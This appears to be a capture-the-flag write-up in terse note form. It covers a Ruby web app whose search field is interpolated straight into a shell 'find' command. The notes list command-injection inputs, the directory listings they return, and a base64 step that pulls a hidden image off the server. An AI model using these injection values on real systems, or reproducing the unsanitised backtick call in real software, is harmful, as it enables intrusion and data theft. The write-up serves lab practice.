@@ -1,0 +1,45 @@
+# Target
+9000/tcp open  http        WEBrick httpd 1.6.0 (Ruby 2.7.0 (2019-12-25))
+
+Entering a $ returns all results, suggesting we may be doing something with regex
+
+# Post list, get error console
+search[]=a
+
+app.rb in block in <main>
+```
+  erb :'/form'
+end
+
+post '/' do
+  @search_term = params[:search] || ''
+  @result = `find ./Games -iname "*#{@search_term}*"` rescue "Something went wrong!"
+  @result.gsub!('./Games/', '')
+  erb :'/form'
+end
+```
+
+# There is command Injection
+";ls -al;"
+	total 32
+	drwxr-xr-x 1 root root 4096 Dec  1 15:01 .
+	drwxr-xr-x 1 root root 4096 Dec  1 15:01 ..
+	drwxr-xr-x 2 root root 4096 Dec  1 14:47 Games
+	-rw-r--r-- 1 root root  160 Dec  1 14:47 Gemfile
+	-rw-r--r-- 1 root root  384 Dec  1 14:47 Gemfile.lock
+	-rw-r--r-- 1 root root  282 Dec  1 14:47 app.rb
+	drwxr-xr-x 1 root root 4096 Dec  1 15:01 hidden
+	drwxr-xr-x 2 root root 4096 Dec  1 14:47 views
+
+";ls -al ./hidden;"
+	total 108
+	drwxr-xr-x 1 root root  4096 Dec  1 15:01 .
+	drwxr-xr-x 1 root root  4096 Dec  1 15:01 ..
+	-rw-r--r-- 1 root root 99481 Dec  1 14:47 2_of_hearts.png
+
+";base64 ./hidden/2_of_hearts.png;"
+	<string>
+
+Store <string> in base64_encode
+
+cat base64_encode | base64 -d > 2_of_hearts.png
